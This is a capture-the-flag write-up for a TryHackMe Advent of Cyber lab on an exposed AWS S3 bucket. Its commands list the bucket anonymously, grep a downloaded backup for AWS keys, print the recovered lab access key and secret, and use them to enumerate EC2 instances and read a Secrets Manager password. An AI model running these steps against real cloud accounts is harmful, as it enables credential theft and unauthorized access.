# Advent of Cyber - Day 17

Link: [Advent Of Cyber 3 on TryHackMe](https://tryhackme.com/room/adventofcyber3)

### Question 1

What is the name of the S3 Bucket used to host the HR Website announcement?

Copy the image address: `https://s3.amazonaws.com/images.bestfestivalcompany.com/flyer.png`, it is contained within.

Answer: `images.bestfestivalcompany.com`

### Question 2

What is the message left in the flag.txt object from that bucket?

Command: `curl https://s3.amazonaws.com/images.bestfestivalcompany.com/flag.txt`

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day17/2.png?raw=true)

Answer: `It's easy to get your elves data when you leave it so easy to find!`

### Question 3

What other file in that bucket looks interesting to you?

Command: `aws s3 ls s3://images.bestfestivalcompany.com/ --no-sign-request`

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day17/3.png?raw=true)

Answer: `wp-backup.zip`

### Question 4

What is the AWS Access Key ID in that file?

Commands: 
```bash
curl https://s3.amazonaws.com/images.bestfestivalcompany.com/wp-backup.zip > wp-backup.zip
unzip -qq wp-backup.zip
cd wp_backup
grep -Rn "AKIA" ./
```

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day17/4.1.png?raw=true)

For the secret key: `grep -Rn "S3_" ./`

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day17/4.2.png?raw=true)

Answer: `AKIAQI52OJVCPZXFYAOI`

### Question 5

What is the AWS Account ID that access-key works for?

Commands:
```bash
aws configure --profile temp

# Fill in AWS Access Key: AKIAQI52OJVCPZXFYAOI
# Fill in AWS Secret Access Key: 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
# Fill in Default region name: us-east-1
# Fill in Default output format: json

aws sts get-caller-identity --profile temp
```

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day17/5.png?raw=true)

Answer: `019181489476`

### Question 6

What is the Username for that access-key?

See the previous question.

Answer: `ElfMcHR@bfc.com`

### Question 7

There is an EC2 Instance in this account. Under the TAGs, what is the Name of the instance?

Command: `aws ec2 describe-instances --output text --region us-east-1 --profile me`

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day17/7.png?raw=true)

Answer: `HR-Portal`

### Question 8

What is the database password stored in Secrets Manager?

We first want to get the list of secrets: `aws secretsmanager list-secrets --profile me`

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day17/8.1.png?raw=true)

We then want to get the secret named `HR-Password`: `aws secretsmanager get-secret-value --secret-id HR-Password --version-stage AWSPREVIOUS --profile me`. This gives us a string that tells us the secret is in another region. (Big "Your princess is in another castle vibes)

Santa lives in the north pole, so let us try with `eu-north-1`: `aws secretsmanager get-secret-value --secret-id HR-Password --version-stage AWSPREVIOUS --profile me --region eu-north-1`

![](https://github.com/AtomicNicos/knowledge-base/blob/main/writeup_resources/aoc3/day17/8.2.png?raw=true)

Answer: `Winter2021!`